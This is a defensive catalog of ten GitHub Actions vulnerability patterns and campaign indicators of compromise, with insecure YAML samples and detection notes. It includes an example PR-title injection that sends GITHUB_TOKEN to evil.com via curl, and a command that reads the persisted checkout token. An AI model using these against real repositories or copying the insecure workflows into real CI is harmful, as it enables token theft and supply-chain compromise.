# PRT Scan Vulnerability Pattern Catalog

Indicators of compromise and vulnerability patterns derived from the PRT Scan / TeamPCP campaign documented by Wiz.

## Pattern Index

### PRT-001: pull_request_target + Checkout PR Head

**Severity**: CRITICAL

The workflow triggers on `pull_request_target` (which runs in the base repo context with write tokens) and checks out the PR's head commit instead of the base branch. This gives the PR author's code access to the repository's `GITHUB_TOKEN` with write permissions.

**Vulnerable Pattern**:
```yaml
on:
  pull_request_target:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checks out untrusted code
```

**Why it's dangerous**: `pull_request_target` intentionally provides the base repo's token so workflows can comment on PRs, label PRs, etc. But if the workflow also runs the PR's code (via checkout), the attacker's code can exfiltrate the token.

**PRT Scan Phase Enabled**: EXFIL (Phase 1)

**Detection in Logs**:
- Workflow triggered by `pull_request_target` event
- Checkout step references `pull_request` context variables
- Subsequent steps execute code from the checked-out PR

---

### PRT-002: Credential Persistence via actions/checkout

**Severity**: HIGH (standalone) / CRITICAL (combined with PRT-001)

`actions/checkout` defaults to `persist-credentials: true`, which saves the `GITHUB_TOKEN` to the local git configuration. Any subsequent command in the workflow can extract it.

**Vulnerable Pattern**:
```yaml
steps:
  - uses: actions/checkout@v4  # persist-credentials defaults to true
  - run: |
      # Token is now in .git/config and accessible via:
      git config --get http.https://github.com/.extraheader
```

**Why it's dangerous**: Even without `pull_request_target`, if any untrusted code executes after checkout (e.g., via `npm install` running a postinstall script from a dependency), the token can be stolen.

**PRT Scan Phase Enabled**: EXFIL (Phase 1)

**Detection in Logs**:
- `actions/checkout` without explicit `persist-credentials: false`
- Git credential helper configured in `.git/config`
- Any `git config` read operations in subsequent steps

---

### PRT-003: Script Injection via Untrusted PR Data

**Severity**: CRITICAL (when combined with PRT-001)

Workflow `run:` blocks that interpolate PR-controlled data (title, body, branch name, commit messages) without sanitization allow shell injection attacks.

**Vulnerable Patterns**:
```yaml
# Pattern A: Direct interpolation
- run: echo "PR title: ${{ github.event.pull_request.title }}"

# Pattern B: In a script
- run: |
    ./test.sh "${{ github.event.pull_request.head.ref }}"

# Pattern C: Environment variable injection
- run: make test
  env:
    BRANCH_NAME: ${{ github.event.pull_request.head.ref }}
```

**Why it's dangerous**: An attacker can craft a PR title like `"; curl http://evil.com/?token=$GITHUB_TOKEN #"` to inject arbitrary commands. The `${{ }}` expression is evaluated before the shell runs, so the injected code executes with the workflow's full permissions.

**PRT Scan Phase Enabled**: EXFIL (Phase 1), RECON (Phase 2)

**Detection in Logs**:
- `run:` steps containing `${{ github.event.pull_request.* }}`
- Environment variables set from PR context without sanitization
- Shell commands that don't use proper quoting

---

### PRT-004: Missing or Overly Broad Permissions

**Severity**: HIGH

Workflows that don't specify a top-level `permissions:` block inherit the repository's default token permissions (often `write` for contents). Even when `permissions:` is present, overly broad grants increase blast radius.

**Vulnerable Patterns**:
```yaml
# Pattern A: No permissions block at all
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    # No permissions: block → inherits repo defaults

# Pattern B: Overly broad permissions
permissions:
  contents: write      # Only needs: read
  packages: write      # Not needed at all
  id-token: write      # Only needed for OIDC

# Pattern C: Job-level override that's too broad
jobs:
  deploy:
    permissions:
      contents: write  # Should be minimal
```

**Why it's dangerous**: A stolen `GITHUB_TOKEN` with `contents: write` can push commits directly to protected branches (if branch protection allows the token), modify repository contents, or trigger other workflows.

**PRT Scan Phase Enabled**: DISPATCH (Phase 3), LABEL_BYPASS (Phase 4)

**Detection in Logs**:
- No `permissions:` block in workflow or job
- `permissions: write` for scopes that only need `read`
- `id-token: write` without OIDC usage

---

### PRT-005: Unpinned Action Versions

**Severity**: MEDIUM

Actions referenced by tag (`@v3`) rather than commit SHA can be mutated by the action maintainer. A compromised or renamed action tag can introduce supply chain attacks.

**Vulnerable Pattern**:
```yaml
- uses: actions/checkout@v4           # Tag — mutable
- uses: actions/setup-node@v4         # Tag — mutable
- uses: some-org/some-action@main      # Branch — mutable
```

**Hardened Pattern**:
```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # SHA — immutable
- uses: actions/setup-node@60edb5dd541a7dc3869a40e5f7b3c6e3b8e4e4e4  # SHA — immutable
```

**Why it's dangerous**: An attacker who compromises an action's repository can push a malicious version to an existing tag. All workflows using that tag will immediately run the malicious code.

**PRT Scan Phase Enabled**: Supply chain vector (pre-attack)

**Detection in Logs**:
- `uses:` references with `@v` tags or `@main`/`@master`
- No `@` followed by a 40-character hex SHA

---

### PRT-006: First-Time Contributor Approval Bypass

**Severity**: MEDIUM

Workflows triggered by `pull_request_target` from forks run automatically for first-time contributors unless the repository has "Require approval for all outside collaborators" enabled. PRT Scan exploited this by creating fresh fork PRs.

**Vulnerable Configuration**:
- Repository settings: "Require approval for first-time contributors only" (not "all outside collaborators")
- Workflow uses `pull_request_target` without checking `github.event.pull_request.author_association`

**Mitigation Pattern**:
```yaml
jobs:
  trusted-check:
    if: github.event.pull_request.author_association == 'COLLABORATOR' ||
        github.event.pull_request.author_association == 'MEMBER' ||
        github.event.pull_request.author_association == 'OWNER'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Author is trusted"
```

**PRT Scan Phase Enabled**: Entry vector (pre-EXFIL)

**Detection in Logs**:
- `pull_request_target` trigger without author_association check
- Repository settings allowing first-time contributor workflows to auto-run

---

### PRT-007: Path-Based Trigger Abuse

**Severity**: MEDIUM

Workflows that trigger on specific paths can be bypassed by including a benign change in a monitored path alongside malicious changes in unmonitored paths.

**Vulnerable Pattern**:
```yaml
on:
  pull_request_target:
    paths:
      - 'docs/**'        # Only triggers for docs changes
      - 'README.md'      # Only triggers for README changes
```

**Why it's dangerous**: An attacker modifies both `docs/guide.md` (triggers the workflow) and `.github/workflows/ci.yml` (malicious modification). The path filter passes, and the workflow runs with the attacker's modified workflow file from the base branch — but if the workflow checks out PR code, the attacker's changes execute.

**PRT Scan Phase Enabled**: Entry vector (pre-EXFIL)

**Detection in Logs**:
- `paths:` filters on `pull_request_target` workflows
- Path filters that don't include `.github/workflows/**`

---

### PRT-008: Untrusted workflow_dispatch / repository_dispatch

**Severity**: MEDIUM

Workflows triggered by `workflow_dispatch` or `repository_dispatch` that accept inputs and pass them unsanitized to `run:` blocks or use them in action arguments.

**Vulnerable Pattern**:
```yaml
on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Target to deploy'
        required: true

jobs:
  deploy:
    steps:
      - run: ./deploy.sh ${{ github.event.inputs.target }}  # Injection!
```

**PRT Scan Phase Enabled**: DISPATCH (Phase 3)

**Detection in Logs**:
- `workflow_dispatch` or `repository_dispatch` triggers
- `inputs` interpolated into `run:` blocks without sanitization

---

### PRT-009: Secrets in Untrusted Code Context

**Severity**: HIGH

Workflows that expose secrets (via `secrets.*` or environment variables) in jobs that also execute untrusted code.

**Vulnerable Pattern**:
```yaml
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}       # Exposed to untrusted code!
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_KEY }}   # Exposed to untrusted code!
```

**Why it's dangerous**: `npm install` runs code from `package.json` scripts and postinstall hooks. If the PR modifies `package.json`, the attacker's code runs with access to all environment variables including secrets.

**PRT Scan Phase Enabled**: EXFIL (Phase 1)

**Detection in Logs**:
- `secrets.*` used in jobs that also check out PR code
- Environment variables containing secrets in jobs with `pull_request_target`
- Secrets passed to actions that execute PR-controlled code

---

### PRT-010: Forked Action References

**Severity**: LOW

Workflows that reference actions from forks (not the canonical repository) or use local actions (`.github/actions/*`) that can be modified via PR.

**Vulnerable Pattern**:
```yaml
- uses: some-user/forked-action@main     # Not the canonical repo
- uses: ./.github/actions/my-action       # Modifiable via PR
```

**PRT Scan Phase Enabled**: Supply chain vector (pre-attack)

**Detection in Logs**:
- `uses:` referencing non-canonical repositories
- Composite actions referenced from `.github/actions/` in `pull_request_target` workflows

---

## IOC Patterns from PRT Scan Campaign

### Branch Naming Patterns
- `prt-` prefix in branch names
- Random-looking branch names with 8+ alphanumeric characters
- Branch names matching `^[a-z]{3,5}-\d{4,6}$` pattern

### Log Markers
- `PRT-SCAN-RESEARCH-NONCE-` in comments or output
- Unexpected `curl` or `wget` calls to external domains in CI logs
- `http://169.254.169.254/` (cloud metadata endpoint) access in CI logs
- `TruffleHog` or `trufflehog` binary execution in unexpected contexts

### Network Indicators
- Outbound connections to IP addresses during build steps
- DNS lookups to newly registered domains from CI runners
- HTTPS requests to `api.github.com` from `run:` steps (not the official Actions runtime)

### File System Indicators
- Unexpected `conftest.py` modifications in PRs
- `package.json` with modified `scripts` entries in PRs
- `build.rs` modifications in Rust projects
- New `.npmrc`, `.pypirc`, or `credentials.json` files in PRs